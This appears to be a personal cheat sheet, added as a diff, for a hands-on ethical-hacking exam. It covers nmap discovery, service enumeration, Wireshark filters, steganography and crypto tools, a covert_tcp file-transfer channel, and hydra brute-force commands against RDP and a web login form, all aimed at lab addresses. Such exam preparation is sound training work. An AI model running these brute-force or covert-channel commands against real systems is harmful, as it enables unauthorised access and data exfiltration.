@@ -1,0 +1,108 @@
+Host Discovery
+There will be 6-7 live host in a network at the time of exam.
+Look closly there are some firewalls in a network too confirm ips and systems before submiting  answer.
+nmap -sP 192.168.101.0/24 To Scan ping weep sometimes it can be used to baypass firealls. it need root permission to run
+nmap -PR -sn 192.168.101.0/24 To Scan the network throw ARP and don't scan ports, so it can take less time to find out live hosts. after that we can use specific IP's to scan ports and services.
+
+nmap 192.168.43.* For general host scan
+nmap 192.168.43.0-255
+
+
+
+
+Port and Service with script scan 
+nmap -sC -sV -p- -A -v -T4 -O -iL LIS-TOF-IPS.txt 
+nmap -sC -sV -p- -A -v -T4 -O 192.168.43.151-155    To scan the list of ips at a time along with script scan and version of services and to do all port scan with aggresive aproach with threats of -T4 this can be done to scan live hosts that we found in a host discovery scan earlier.
+
+Points To Note:
+If nmap is not able to guess os with -O then we can use -os-guess script from nmap. 
+To do OS scan use script scan and use aggressive mode to get confirm output.
+Save to output with 
+--top-ports 20 To Scan top 20 ports on the network
+NetBIOS: To enumerate system names and their mac addresses also it can be used to find out what netBIOS neme services that are running on the system. Port:137,139 Tool: Nmap script
+
+SNMP: TO enumerate network-connected devices on the system Port:161 Tool: snmp-check
+
+LDAP: LDAP is a lightweight directory access protocal which stores information such as usernames, passwords and computer accounts Port: 389, 636 Tool: AD Explorer (Windows)
+
+NFS: Store files on the network Port:2049 Tool: nmap
+
+DNS: Stores information about DNS services Tool: nslookup, Dig
+
+RPC: Remote procedure cell Port:111
+
+SMB: Server Message Block, It provides shared access to files and printers on the network Port: 139, 445 Tool: nmap (smb-enum/many more for each specific use), SMBMap:"Too good", SMBClient
+
+Last Option: Global Network Inventory (Windows) 
+
+
+"Main Thing: Use Enum4Linux-> This Does Everything to enumerate just add correct swiches to cammand"
+
+FTP use hydra to brute force
+
+SNMP : SNMP-Check -> use this tool to enumarate information such and uptime, hostname, memory allowcation and every possible detail about SNMP. Also we can use nmap scripts for specific information from SNMP. use script or snmp-check to get any information.
+SNMP : Metasploit can be used in brute force SNMP login with SNMP-login module "This does not give you access" this provide information about file share are they public or private
+
+SMB: use nmap scripts as per the requirement like smb-enum-user or smb-enum-shares and so on
+
+
+RDP: scan the network and look for open rdp port if unsure about the port then scan it through metasploit and after finding open rdp port run a hydra to brute force using hydra -L -P rdp://10.10.10.10 and find a flag in windows system
+
+
+
+
+use the filter for everything 
+ip.addr == 192.168.0.1 also we can use ip.addr == 192.168.0.1 && ip.dst == 8.8.8.8
+or we can specify source and destination ip to filter it : ip.src == 192.168.43.1 && ip.dst == 8.8.8.8
+tcp.flags.syn ==1 : this can be used to filter the syn packets on the pcap file to analaze a dos attack.
+To find a comments from the flag select the flag and look at the bottom left side there is a paper or flag symbol in there we can find a comments packet hash, time and so many thing about specific packet
+To find out what ips were under dos attack and dos attack was comming from which ip to do that go to Statestics -> Conversations then there e can analize it using ipv4 or ipv6 conversation.
+
+
+
+
+
+Advance Filters:
+
+tcp.flags.syn==1 and tcp.flags.ack==0 and tcp.window_size > 1024 : "To filter tcp connect scan packets"
+
+
+Use steghide to do stegnography
+Use stegcracker to brute force Stegno file
+Text can be hidden using Stegsnow or we can hide text file in another file using stegsnow 
+if password is not given then use stegcracker to crack it
+To find out what encryption is used in stegno encryption we can use --info option from steghide tool
+To Encode and decode plain text use BCText encoder it is an windows tool (Very easy)
+
+Covert TCP 
+
+Listner: 
+./covert_tcp -dest 10.0.2.46 -source 10.0.2.42 -source_port 9999 -dest_port 8888 -server -file /home/s4msepi0l/Desktop/receive/receive.txt
+
+Sender:
+/covert_tcp -dest 10.0.2.46 -source 10.0.2.42 -source_port 8888 -dest_port 9999 -file File-we-want-to-send.txt
+
+
+Hashes.com
+Crackstation.com
+
+HASHMYFILES: To find out if the was tempered then we can use 'HashMyFiles' tool in windows to do that. we just have to give files to the application it will automatically do his thing.
+
+CryptoForge: To encrypt and decrypt files we can use CryptoForge tool. we can encrypt and decrypt files my right clicking on files.
+
+BCTextEncoder: To encode and decode in HEX format we can use BC-Text-Encoder. to identify when we have to use bctextencoder we can open file and see hash if it says ------BEGIN ENCODED MESSAGE----- 5s+e9f5s+9f598g4we+d5+fw+f4+w ------END ENCODED MESSAGE----- we have to use bctextencoder
+
+Cryptool: we can encrypt and decrypt files with .hex extension in Cryptool. To decrypt .hex file we can load the file then go to analysis and select the key lenth given in the quetion and the decrypt it. if the results are in encoded format and they have not specified to decrypt that still try to decrypt and fill both answer as we have 5 options to fill the answer.
+
+Veracrypt: we can encrypt and decrypt files and valumes or whole database in veracrypt. 
+First go the path we want to brute force and collect some information for our attack 
+
+what form method is being used POST based or GET based
+then we need information about the username and password fild names 
+after that we need a submit button name and type for our attack 
+and lastly we need a alert message so hydra can filter correct and incorrect password 
+
+hydra http:/10.10.10.10 http-form-get "/user/login.php:username=^user^&password=^pass^&submit=submit&password is incorrect" -L /usr/wordlist/username.txt -P /usr/wordlist/password.txt 
+
+
+
